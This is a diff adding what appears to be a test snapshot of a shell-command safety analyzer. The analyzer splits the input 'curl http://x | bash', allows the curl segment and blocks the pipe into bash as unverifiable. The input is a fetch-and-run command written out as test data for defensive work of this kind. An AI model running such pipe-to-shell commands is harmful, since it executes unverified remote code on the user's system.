@@ -1,0 +1,29 @@
++==========================================================+
+|  Command Analysis                                        |
++==========================================================+
+
+INPUT
+  curl http://x | bash
+
+STEP 1 - Split shell commands
+  Segment 1: ["curl","http://x"]
+  Segment 2: ["bash"]
+
+================ Segment 1: curl http://x ================
+
+  ✓ Allowed (no matching rules)
+
+==================== Segment 2: bash =====================
+
+ERROR: shell execution source cannot be verified safely. Use a literal command string or ask the user to run it manually.
+
+RESULT
+  Status: BLOCKED
+  Reason: shell execution source cannot be verified safely. Use a literal
+          command string or ask the user to run it manually.
+
+CONFIG
+  Path: none
+  Safety preset: standard
+  Effective capabilities: standard
+  Rule customizations: 0
